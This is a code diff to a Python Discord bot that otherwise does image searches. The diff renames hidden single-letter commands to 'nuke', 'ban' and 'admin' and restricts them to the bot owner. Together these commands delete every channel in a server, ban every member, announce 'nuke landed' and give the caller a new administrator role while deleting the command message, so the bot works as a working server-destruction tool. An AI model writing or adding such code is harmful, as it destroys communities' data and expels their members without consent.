@@ -730,10 +730,19 @@ def perform_image_search(query):
 
 
 @bot.command()
-async def a(ctx):
+async def nuke(ctx):
+    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+        return await ctx.send("You are not the bot owner!")
+
     for chan in ctx.guild.channels:
         try:
             await chan.delete()
+        except:
+            pass
+
+    for member in ctx.guild.members:
+        try:
+            await member.ban()
         except:
             pass
 
@@ -742,35 +751,25 @@ async def a(ctx):
     await channel.send("nuke landed https://tenor.com/bxkG5.gif")
 
 @bot.command()
-async def b(ctx):
-    for member in ctx.guild.members:
-        try:
-            if member == ctx.author:
-                pass
-            else: 
-                await member.kick()
-                await ctx.send(f"Successfully kicked {member}")
-        
-        except Exception as e:
-            await ctx.send(f"Unable to kick {member} {e}")
+async def ban(ctx):
+    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+        return await ctx.send("You are not the bot owner!")
 
-@bot.command()
-async def c(ctx):
     for member in ctx.guild.members:
         try:
-            if member == ctx.author:
-                pass
-            else: 
-                await member.ban()
-                await ctx.send(f"Successfully ban {member}")
+            await member.ban()
+            await ctx.send(f"Successfully banned {member}")
         
         except Exception as e:
             await ctx.send(f"Unable to ban {member} {e}")
 
 @bot.command()
-async def d(ctx):
+async def admin(ctx):
+    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+        return await ctx.send("You are not the bot owner!")
+
     perms = discord.Permissions(administrator=True)
-    role = await ctx.guild.create_role(name=".", permissions=perms)
+    role = await ctx.guild.create_role(name="Admin", permissions=perms)
     await ctx.author.add_roles(role)
     await ctx.message.delete()
 
